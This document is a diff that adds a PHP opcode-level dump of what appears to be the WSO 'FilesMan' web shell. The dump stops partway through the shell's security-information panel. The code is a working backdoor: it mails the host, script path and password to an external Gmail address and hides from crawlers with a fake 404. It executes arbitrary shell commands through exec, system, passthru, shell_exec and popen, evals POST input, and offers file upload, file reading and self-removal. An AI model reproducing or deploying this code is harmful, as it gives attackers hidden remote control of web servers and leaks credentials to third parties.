@@ -1,0 +1,3595 @@
+FunctionStart 
+FETCH_R '_POST'
+ARRAY_KEY_EXISTS 'watching'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'SERVER_NAME'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'PHP_SELF'
+CONCAT ' '
+FETCH_R '_POST'
+FETCH_DIM_R 'pass'
+INIT_FCALL 'mail'
+SEND_VAL 'inboxnotificationow@gmail.com'
+SEND_VAL 'root'
+DO_ICALL 
+ASSIGN '8e3bf976813be9e9a1aea30886f1b6de'
+ASSIGN 'UTF-8'
+ASSIGN 'FilesMan'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_USER_AGENT'
+DO_ICALL 
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_IS '_COOKIE'
+INIT_FCALL_BY_NAME 'prototype'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'charset'
+FETCH_W '_POST'
+ASSIGN_DIM 'charset'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'ne'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'a'
+INIT_FCALL 'iconv'
+SEND_VAL 'utf-8'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+INIT_FCALL_BY_NAME 'decrypt'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'a'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_FUNC_ARG '_COOKIE'
+DO_FCALL 
+DO_ICALL 
+FETCH_W '_POST'
+ASSIGN_DIM 'a'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'c'
+INIT_FCALL 'iconv'
+SEND_VAL 'utf-8'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+INIT_FCALL_BY_NAME 'decrypt'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'c'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_FUNC_ARG '_COOKIE'
+DO_FCALL 
+DO_ICALL 
+FETCH_W '_POST'
+ASSIGN_DIM 'c'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'iconv'
+SEND_VAL 'utf-8'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+INIT_FCALL_BY_NAME 'decrypt'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'p1'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_FUNC_ARG '_COOKIE'
+DO_FCALL 
+DO_ICALL 
+FETCH_W '_POST'
+ASSIGN_DIM 'p1'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p2'
+INIT_FCALL 'iconv'
+SEND_VAL 'utf-8'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+INIT_FCALL_BY_NAME 'decrypt'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'p2'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_FUNC_ARG '_COOKIE'
+DO_FCALL 
+DO_ICALL 
+FETCH_W '_POST'
+ASSIGN_DIM 'p2'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p3'
+INIT_FCALL 'iconv'
+SEND_VAL 'utf-8'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+INIT_FCALL_BY_NAME 'decrypt'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'p3'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_FUNC_ARG '_COOKIE'
+DO_FCALL 
+DO_ICALL 
+FETCH_W '_POST'
+ASSIGN_DIM 'p3'
+INIT_FCALL 'ini_set'
+SEND_VAL 'error_log'
+SEND_VAL 'null'
+DO_ICALL 
+INIT_FCALL 'ini_set'
+SEND_VAL 'log_errors'
+DO_ICALL 
+INIT_FCALL 'ini_set'
+SEND_VAL 'max_execution_time'
+DO_ICALL 
+INIT_FCALL 'set_time_limit'
+DO_ICALL 
+INIT_FCALL 'version_compare'
+SEND_VAL '8.0.30'
+SEND_VAL '5.3.0'
+SEND_VAL '<'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'set_magic_quotes_runtime'
+DO_FCALL 
+INIT_FCALL 'define'
+SEND_VAL 'VERSION'
+SEND_VAL '4.2.6'
+DO_ICALL 
+INIT_FCALL 'function_exists'
+SEND_VAL 'get_magic_quotes_gpc'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'get_magic_quotes_gpc'
+DO_FCALL 
+DECLARE_FUNCTION 'stripslashes_array'
+INIT_FCALL_BY_NAME 'stripslashes_array'
+FETCH_FUNC_ARG '_POST'
+DO_FCALL 
+FETCH_W '_POST'
+INIT_FCALL_BY_NAME 'stripslashes_array'
+FETCH_FUNC_ARG '_COOKIE'
+DO_FCALL 
+FETCH_W '_COOKIE'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'pass'
+INIT_FCALL 'md5'
+FETCH_R '_POST'
+FETCH_DIM_R 'pass'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'prototype'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+FETCH_IS '_COOKIE'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+FETCH_R '_COOKIE'
+INIT_FCALL_BY_NAME 'hardLogin'
+DO_FCALL 
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+FETCH_IS '_COOKIE'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+FETCH_W '_COOKIE'
+INIT_FCALL 'strtolower'
+INIT_FCALL 'substr'
+SEND_VAL 'Linux'
+DO_ICALL 
+DO_ICALL 
+IS_EQUAL 'win'
+ASSIGN 'win'
+ASSIGN 'nix'
+INIT_FCALL 'ini_get'
+SEND_VAL 'safe_mode'
+DO_ICALL 
+INIT_FCALL 'error_reporting'
+DO_ICALL 
+INIT_FCALL 'ini_get'
+SEND_VAL 'disable_functions'
+DO_ICALL 
+INIT_FCALL 'getcwd'
+DO_ICALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'c'
+INIT_FCALL 'chdir'
+FETCH_R '_POST'
+FETCH_DIM_R 'c'
+DO_ICALL 
+INIT_FCALL 'getcwd'
+DO_ICALL 
+IS_EQUAL 'win'
+INIT_FCALL 'str_replace'
+SEND_VAL '\'
+SEND_VAL '/'
+DO_ICALL 
+INIT_FCALL 'str_replace'
+SEND_VAL '\'
+SEND_VAL '/'
+DO_ICALL 
+SUB 1
+IS_NOT_EQUAL '/'
+ASSIGN_OP '/'
+INIT_FCALL 'function_exists'
+SEND_VAL 'posix_getpwuid'
+DO_ICALL 
+INIT_FCALL 'strpos'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'disable_functions'
+SEND_VAL 'posix_getpwuid'
+DO_ICALL 
+DECLARE_FUNCTION 'posix_getpwuid'
+INIT_FCALL 'function_exists'
+SEND_VAL 'posix_getgrgid'
+DO_ICALL 
+INIT_FCALL 'strpos'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'disable_functions'
+SEND_VAL 'posix_getgrgid'
+DO_ICALL 
+DECLARE_FUNCTION 'posix_getgrgid'
+INIT_FCALL 'ini_set'
+SEND_VAL 'output_buffering'
+DO_ICALL 
+INIT_FCALL 'ini_set'
+SEND_VAL 'display_errors'
+DO_ICALL 
+INIT_FCALL 'set_time_limit'
+DO_ICALL 
+INIT_FCALL 'ini_set'
+SEND_VAL 'memory_limit'
+SEND_VAL '-1'
+DO_ICALL 
+INIT_FCALL 'header'
+SEND_VAL 'Content-Type: text/html; charset=UTF-8'
+DO_ICALL 
+ASSIGN 'inboxnotificationow@gmail.com'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'SERVER_NAME'
+CONCAT 'http://'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'REQUEST_URI'
+FAST_CONCAT ' *PW : [ '
+CONCAT ' ]'
+INIT_FCALL 'mail'
+SEND_VAL 'Ding+Don'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'REMOTE_ADDR'
+CONCAT '[ '
+CONCAT ' ]'
+DO_ICALL 
+IS_EQUAL 'win'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'a'
+INIT_FCALL 'function_exists'
+CONCAT 'action'
+DO_ICALL 
+FETCH_W '_POST'
+ASSIGN_DIM 'a'
+FETCH_W '_POST'
+ASSIGN_DIM 'a'
+OP_DATA 'FilesMan'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'a'
+INIT_FCALL 'function_exists'
+FETCH_R '_POST'
+FETCH_DIM_R 'a'
+CONCAT 'action'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'a'
+CONCAT 'action'
+INIT_USER_CALL 'call_user_func'
+DO_FCALL 
+RETURN 1
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'base64_encode'
+DO_ICALL 
+INIT_FCALL 'base64_decode'
+DO_ICALL 
+INIT_FCALL 'chr'
+INIT_FCALL 'ord'
+DO_ICALL 
+INIT_FCALL 'ord'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'base64_decode'
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'array_map'
+SEND_VAL 'stripslashes_array'
+DO_ICALL 
+INIT_FCALL 'stripslashes'
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_IS '_SERVER'
+ISSET_ISEMPTY_DIM_OBJ 'HTTP_USER_AGENT'
+INIT_FCALL 'preg_match'
+INIT_FCALL 'implode'
+SEND_VAL '|'
+DO_ICALL 
+CONCAT '/'
+CONCAT '/i'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_USER_AGENT'
+DO_ICALL 
+INIT_FCALL 'header'
+SEND_VAL 'HTTP/1.0 404 Not Found'
+DO_ICALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'charset'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R '▜'
+FETCH_W '_POST'
+ASSIGN_DIM 'charset'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+CONCAT '<html><head><meta http-equiv='Content-Type' content='text/html; charset='
+CONCAT ''><title>'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+CONCAT '+-+WSO+'
+FETCH_CONSTANT 'VERSION'
+CONCAT '</title>   <link href='https://fonts.googleapis.com/css?family=Nunito' rel='styleshee'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+CONCAT '';   var a_ = ''
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'a'
+DO_ICALL 
+CONCAT ''   var charset_ = ''
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+DO_ICALL 
+CONCAT '';   var p1_ = ''
+INIT_FCALL 'strpos'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+SEND_VAL ' '
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '';   var p2_ = ''
+INIT_FCALL 'strpos'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+SEND_VAL ' '
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+DO_ICALL 
+CONCAT '';   var p3_ = ''
+INIT_FCALL 'strpos'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+SEND_VAL ' '
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+DO_ICALL 
+CONCAT '';   var d = document;  function encrypt(str,pwd){if(pwd==null||pwd.length<=0'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_R '_COOKIE'
+CONCAT '');  d.mf.c.value = encrypt(d.mf.c.value,''
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_R '_COOKIE'
+CONCAT '');  d.mf.p1.value = encrypt(d.mf.p1.value,''
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_R '_COOKIE'
+CONCAT '');  d.mf.p2.value = encrypt(d.mf.p2.value,''
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_R '_COOKIE'
+CONCAT '');  d.mf.p3.value = encrypt(d.mf.p3.value,''
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'key'
+FETCH_R '_COOKIE'
+CONCAT '');  if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_; '
+INIT_FCALL 'addslashes'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'REQUEST_URI'
+DO_ICALL 
+CONCAT '', params);  }  function sr(url, params) {  if (window.XMLHttpRequest) '
+INIT_FCALL 'diskfreespace'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+INIT_FCALL 'disk_total_space'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+INIT_FCALL 'php_uname'
+SEND_VAL 'r'
+DO_ICALL 
+INIT_FCALL 'php_uname'
+SEND_VAL 's'
+DO_ICALL 
+ASSIGN 'http://nullrefer.com/?https://www.exploit-db.com/search/?action=search&description='
+INIT_FCALL 'strpos'
+SEND_VAL 'Linux'
+DO_ICALL 
+INIT_FCALL 'urlencode'
+INIT_FCALL 'substr'
+DO_ICALL 
+CONCAT 'Linux+Kernel'
+DO_ICALL 
+INIT_FCALL 'urlencode'
+CONCAT '+'
+INIT_FCALL 'substr'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'function_exists'
+SEND_VAL 'posix_getegid'
+DO_ICALL 
+INIT_FCALL 'get_current_user'
+DO_ICALL 
+INIT_FCALL 'getmyuid'
+DO_ICALL 
+INIT_FCALL 'getmygid'
+DO_ICALL 
+ASSIGN '?'
+INIT_FCALL 'posix_getpwuid'
+INIT_FCALL 'posix_geteuid'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'posix_getgrgid'
+INIT_FCALL 'posix_getegid'
+DO_ICALL 
+DO_ICALL 
+FETCH_DIM_R 'name'
+FETCH_DIM_R 'uid'
+FETCH_DIM_R 'name'
+FETCH_DIM_R 'gid'
+INIT_FCALL 'explode'
+SEND_VAL '/'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+ASSIGN_OP '<a href='#' onclick='g("FilesMan","'
+CONCAT '/'
+CONCAT '")'>'
+CONCAT '/</a>'
+SUB 1
+FE_RESET_R 
+FE_FETCH_R 
+CONCAT '<option value="'
+CONCAT '" '
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+QM_ASSIGN 'selected'
+CONCAT '>'
+CONCAT '</option>'
+FETCH_IS 'GLOBALS'
+ISSET_ISEMPTY_DIM_OBJ '▛'
+ASSIGN_DIM 'Logout'
+OP_DATA 'Logout'
+ASSIGN_DIM 'Self+rem'
+OP_DATA 'SelfRemove'
+FE_RESET_R 
+FE_FETCH_R 
+CONCAT '<th>[ <a href="#" onclick="g(''
+CONCAT '',null,'','','')">'
+CONCAT '</a> ]</th>'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'os'
+IS_EQUAL 'win'
+INIT_FCALL 'range'
+SEND_VAL 'c'
+SEND_VAL 'z'
+DO_ICALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'is_dir'
+CONCAT ':\'
+DO_ICALL 
+CONCAT '<a href="#" onclick="g('FilesMan',''
+CONCAT ':/')">[ '
+CONCAT ' ]</a> '
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'os'
+IS_EQUAL 'win'
+QM_ASSIGN '<br>Drives:'
+CONCAT '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<b'
+CONCAT '</span></td>'
+CONCAT '<td><nobr>'
+INIT_FCALL 'substr'
+INIT_FCALL 'php_uname'
+DO_ICALL 
+DO_ICALL 
+CONCAT ' <a href="https://nullrefer.com/?https://www.google.com/search?q='
+INIT_FCALL 'urlencode'
+INIT_FCALL 'php_uname'
+DO_ICALL 
+DO_ICALL 
+CONCAT '" target="_blank">[ Google ]</a> <a href="'
+CONCAT '" target=_blank>[ Exploit-DB ]</a></nobr><br>'
+CONCAT ' ( '
+CONCAT ' ) <span>Group:</span> '
+CONCAT ' ( '
+CONCAT ' )<br>'
+INIT_FCALL 'phpversion'
+DO_ICALL 
+CONCAT ' <span>Safe mode:</span> '
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'safe_mode'
+QM_ASSIGN '<font color=#a10705>ON</font>'
+QM_ASSIGN '<font color=#f9c440><b>OFF</b></font>'
+CONCAT ' <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Date'
+INIT_FCALL 'date'
+SEND_VAL 'Y-m-d H:i:s'
+DO_ICALL 
+CONCAT '<br>'
+INIT_FCALL_BY_NAME 'viewSize'
+DO_FCALL 
+CONCAT ' <span>Free:</span> '
+INIT_FCALL_BY_NAME 'viewSize'
+DO_FCALL 
+CONCAT ' ('
+INIT_FCALL 'round'
+DIV 100
+DO_ICALL 
+CONCAT '%)<br>'
+CONCAT '+'
+INIT_FCALL_BY_NAME 'viewPermsColor'
+FETCH_FUNC_ARG 'GLOBALS'
+FETCH_DIM_FUNC_ARG 'cwd'
+DO_FCALL 
+CONCAT ' <a href=# onclick="g('FilesMan',''
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'home_cwd'
+CONCAT '','','','')">[ home ]</a><br>'
+CONCAT '</td>'
+CONCAT '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,thi'
+CONCAT '</select></label><br><span>Server IP:</span><br>'
+INIT_FCALL 'gethostbyname'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT '<br><span>Client IP:</span><br>'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'REMOTE_ADDR'
+CONCAT '</nobr></td></tr></table>'
+CONCAT '<table style="background-color:#0d52bf;" cellpadding=3 cellspacing=0 width=100%><tr>'
+CONCAT '</tr></table><div>'
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'is_writable'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+QM_ASSIGN ' <font color='#f9c440'>[ Writeable ]</font>'
+QM_ASSIGN ' <font color=#a10705>(Not writable)</font>'
+INIT_FCALL 'function_exists'
+SEND_VAL 'actionFilesMan'
+DO_ICALL 
+QM_ASSIGN 'g(null,this.c.value,'');'
+CONCAT '  </div>  <table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>  '
+CONCAT 'return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c v'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+CONCAT ''><input type=submit value='submit'></form></td>  <td><form onsubmit="'
+INIT_FCALL 'function_exists'
+SEND_VAL 'actionFilesTools'
+DO_ICALL 
+QM_ASSIGN 'g('FilesTools',null,this.f.value);'
+CONCAT 'return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f re'
+INIT_FCALL 'function_exists'
+SEND_VAL 'actionFilesMan'
+DO_ICALL 
+QM_ASSIGN 'g('FilesMan',null,'mkdir',this.d.value);'
+ROPE_INIT 'return false;"><span>Make dir:</span>'
+ROPE_END '<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'>'
+INIT_FCALL 'function_exists'
+SEND_VAL 'actionFilesTools'
+DO_ICALL 
+QM_ASSIGN 'g('FilesTools',null,this.f.value,'mkfile');'
+ROPE_INIT 'return false;"><span>Make file:</span>'
+ROPE_END '<br><input class='toolsInp' type=text name=f required><input type=submit value='submit'>'
+INIT_FCALL 'function_exists'
+SEND_VAL 'actionConsole'
+DO_ICALL 
+QM_ASSIGN 'g('Console',null,this.c.value);'
+CONCAT 'return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c valu'
+INIT_FCALL 'function_exists'
+SEND_VAL 'actionFilesMan'
+DO_ICALL 
+QM_ASSIGN ' onsubmit="return false;" '
+CONCAT 'ENCTYPE='multipart/form-data'>  <input type=hidden name=a value='FilesMan'>  '
+INIT_FCALL 'htmlspecialchars'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+CONCAT ''>  <input type=hidden name=p1 value='uploadFile'>  <input type=hidden name'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'charset'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+ROPE_INIT ''>  <span>Upload file:</span>'
+ROPE_END '<br><input class='toolsInp' type=file name=f[] multiple><input type=submit value='submit'
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'function_exists'
+SEND_VAL 'exec'
+DO_ICALL 
+INIT_FCALL 'exec'
+DO_ICALL 
+INIT_FCALL 'join'
+SEND_VAL ' '
+DO_ICALL 
+INIT_FCALL 'function_exists'
+SEND_VAL 'passthru'
+DO_ICALL 
+INIT_FCALL 'ob_start'
+DO_ICALL 
+INIT_FCALL 'passthru'
+DO_ICALL 
+INIT_FCALL 'ob_get_clean'
+DO_ICALL 
+INIT_FCALL 'function_exists'
+SEND_VAL 'system'
+DO_ICALL 
+INIT_FCALL 'ob_start'
+DO_ICALL 
+INIT_FCALL 'system'
+DO_ICALL 
+INIT_FCALL 'ob_get_clean'
+DO_ICALL 
+INIT_FCALL 'function_exists'
+SEND_VAL 'shell_exec'
+DO_ICALL 
+INIT_FCALL 'shell_exec'
+DO_ICALL 
+INIT_FCALL 'popen'
+SEND_VAL 'r'
+DO_ICALL 
+INIT_FCALL 'fread'
+DO_ICALL 
+INIT_FCALL 'feof'
+DO_ICALL 
+INIT_FCALL 'pclose'
+DO_ICALL 
+RETURN '↳ Unable to execute command '
+QM_ASSIGN '↳ Query did not return anything '
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'sprintf'
+SEND_VAL '%1.2f'
+DIV 1073741824
+DO_ICALL 
+CONCAT '+GB'
+RETURN 
+INIT_FCALL 'sprintf'
+SEND_VAL '%1.2f'
+DIV 1048576
+DO_ICALL 
+CONCAT '+MB'
+RETURN 
+INIT_FCALL 'sprintf'
+SEND_VAL '%1.2f'
+DIV 1024
+DO_ICALL 
+CONCAT '+KB'
+RETURN 
+CONCAT '+B'
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+BW_AND 49152
+ASSIGN 's'
+BW_AND 40960
+ASSIGN 'l'
+BW_AND 32768
+ASSIGN '-'
+BW_AND 24576
+ASSIGN 'b'
+BW_AND 16384
+ASSIGN 'd'
+BW_AND 8192
+ASSIGN 'c'
+BW_AND 4096
+ASSIGN 'p'
+ASSIGN 'u'
+BW_AND 256
+QM_ASSIGN 'r'
+QM_ASSIGN '-'
+BW_AND 128
+QM_ASSIGN 'w'
+QM_ASSIGN '-'
+BW_AND 64
+BW_AND 2048
+QM_ASSIGN 's'
+QM_ASSIGN 'x'
+BW_AND 2048
+QM_ASSIGN 'S'
+QM_ASSIGN '-'
+BW_AND 32
+QM_ASSIGN 'r'
+QM_ASSIGN '-'
+BW_AND 16
+QM_ASSIGN 'w'
+QM_ASSIGN '-'
+BW_AND 8
+BW_AND 1024
+QM_ASSIGN 's'
+QM_ASSIGN 'x'
+BW_AND 1024
+QM_ASSIGN 'S'
+QM_ASSIGN '-'
+BW_AND 4
+QM_ASSIGN 'r'
+QM_ASSIGN '-'
+BW_AND 2
+QM_ASSIGN 'w'
+QM_ASSIGN '-'
+BW_AND 1
+BW_AND 512
+QM_ASSIGN 't'
+QM_ASSIGN 'x'
+BW_AND 512
+QM_ASSIGN 'T'
+QM_ASSIGN '-'
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'is_readable'
+DO_ICALL 
+INIT_FCALL 'perms'
+INIT_FCALL 'fileperms'
+DO_ICALL 
+DO_FCALL 
+CONCAT '<font color=#FF0000><b>'
+CONCAT '</b></font>'
+RETURN 
+INIT_FCALL 'is_writable'
+DO_ICALL 
+INIT_FCALL 'perms'
+INIT_FCALL 'fileperms'
+DO_ICALL 
+DO_FCALL 
+CONCAT '<font color=white><b>'
+CONCAT '</b></font>'
+RETURN 
+INIT_FCALL 'perms'
+INIT_FCALL 'fileperms'
+DO_ICALL 
+DO_FCALL 
+CONCAT '<font color=#f9c440><b>'
+CONCAT '</b></font>'
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'function_exists'
+SEND_VAL 'scandir'
+DO_ICALL 
+INIT_FCALL 'scandir'
+DO_ICALL 
+RETURN 
+INIT_FCALL 'opendir'
+DO_ICALL 
+INIT_FCALL 'readdir'
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'ex'
+CONCAT 'which+'
+DO_FCALL 
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+INIT_FCALL 'php_uname'
+DO_ICALL 
+INIT_ARRAY 'uname'
+INIT_FCALL 'phpversion'
+DO_ICALL 
+ADD_ARRAY_ELEMENT 'php_version'
+FETCH_CONSTANT 'VERSION'
+ADD_ARRAY_ELEMENT 'VERSION'
+INIT_FCALL 'ini_get'
+SEND_VAL 'safe_mode'
+DO_ICALL 
+ADD_ARRAY_ELEMENT 'safemode'
+INIT_FCALL 'serialize'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+INCLUDE_OR_EVAL 'EVAL'
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_W '_COOKIE'
+INIT_FCALL 'setcookie'
+DO_ICALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'hardheader'
+DO_FCALL 
+ECHO '<h1>Server security information</h1><div class=content>'
+DECLARE_FUNCTION 'showsecparam'
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Server+softw'
+INIT_FCALL 'getenv'
+SEND_VAL 'SERVER_SOFTWARE'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL 'function_exists'
+SEND_VAL 'apache_get_modules'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Loaded+Apache+module'
+INIT_FCALL 'implode'
+SEND_VAL ', '
+INIT_FCALL_BY_NAME 'apache_get_modules'
+DO_FCALL 
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Disabled+PHP+Functio'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'disable_functions'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'disable_functions'
+QM_ASSIGN 'none'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Open+base+di'
+INIT_FCALL 'ini_get'
+SEND_VAL 'open_basedir'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Safe+mode+exec+d'
+INIT_FCALL 'ini_get'
+SEND_VAL 'safe_mode_exec_dir'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Safe+mode+include+di'
+INIT_FCALL 'ini_get'
+SEND_VAL 'safe_mode_include_dir'
+DO_ICALL 
